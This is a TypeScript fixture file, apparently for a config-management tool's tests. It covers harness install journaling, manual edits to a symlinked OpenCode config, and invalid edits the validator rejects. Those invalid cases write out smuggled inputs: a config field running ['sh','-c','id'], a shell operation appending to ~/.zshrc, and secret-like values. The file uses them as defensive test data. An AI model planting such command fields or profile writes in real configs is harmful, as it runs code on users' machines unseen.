/** A harness binary replaced by an install; rollback restores the previous version from its backup. */
export const HARNESS_JOURNAL_ENTRY: JournalEntry = {
  seq: 1,
  actionID: "install-claude",
  kind: "install-harness",
  class: "harness",
  path: { root: "data", rel: "hub/harnesses/claude-code/current" },
  before: { exists: true, sha256: DIGEST.c, mode: 0o755 },
  after: { exists: true, sha256: DIGEST.f, mode: 0o755 },
  backup: { id: "bk_0001" },
  status: "done",
}

// ---------- symlinked configs: manual edits ----------

/** The OpenCode config is a symlink into the user's dotfiles: hubctl refuses to write it and emits this edit. */
export const SYMLINK = { linkPath: "/Users/dev/.config/opencode", resolvedPath: "/Users/dev/dot/config/opencode/opencode.json" } as const

export const MANUAL_EDIT_MERGE: ManualEdit = {
  kind: "manual-edit",
  reason: "symlinked-config",
  actionID: "opencode-plugin",
  path: { root: "config", rel: "opencode/opencode.json" },
  linkPath: SYMLINK.linkPath,
  resolvedPath: SYMLINK.resolvedPath,
  format: "json",
  owner: "harness:opencode",
  precondition: { exists: true, sha256: DIGEST.d },
  change: { op: "merge", set: [{ pointer: "/plugin/-", value: "@huynle/hub" }] },
}

export const MANUAL_EDIT_MCP: ManualEdit = {
  kind: "manual-edit",
  reason: "symlinked-config",
  actionID: "opencode-mcp",
  path: { root: "config", rel: "opencode/opencode.json" },
  linkPath: SYMLINK.linkPath,
  resolvedPath: SYMLINK.resolvedPath,
  precondition: { exists: true, sha256: DIGEST.d },
  change: { op: "register-mcp-server", harness: "opencode", name: "hub" },
}

const editWith = (patch: Record<string, unknown>) => ({ ...MANUAL_EDIT_MERGE, ...patch })

export const MANUAL_EDIT_INVALID: Record<string, ThreatCase> = {
  secretValue: { value: editWith({ change: { op: "merge", set: [{ pointer: "/server", value: "hat_0123456789abcdef" }] } }), code: "secret" },
  secretPointer: { value: editWith({ change: { op: "merge", set: [{ pointer: "/provider/apiKey", value: "x" }] } }), code: "secret" },
  commandInEdit: { value: editWith({ change: { op: "merge", set: [{ pointer: "/mcp/x", value: { command: ["sh", "-c", "id"] } }] } }), code: "exec_field" },
  relativeResolved: { value: editWith({ resolvedPath: "dot/config/opencode/opencode.json" }), code: "invalid_path" },
  unknownReason: { value: editWith({ reason: "felt-like-it" }), code: "invalid_value" },
  shellOp: { value: editWith({ change: { op: "shell", script: "echo hi >> ~/.zshrc" } }), code: "invalid_value" },
}
